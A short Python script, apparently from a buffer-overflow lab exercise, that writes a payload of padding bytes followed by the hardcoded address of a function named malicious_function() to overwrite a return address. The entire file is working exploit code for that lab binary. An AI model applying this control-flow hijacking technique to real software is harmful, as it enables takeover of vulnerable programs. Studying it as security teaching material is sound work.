def p32(value):
    return value.to_bytes(4, byteorder='little')

if __name__ == "__main__":
    target_address = 0x8049196          # malicious_function() 的函数入口地址
    offset = 0xffffc2ac - 0xffffc260    # 返回地址和 buffer[] 首地址之间的距离

    payload = b"A" * offset + p32(target_address)

    with open("payload.txt", "wb") as f:
        f.write(payload)

    print(f"Payload written to payload.txt: {payload}")
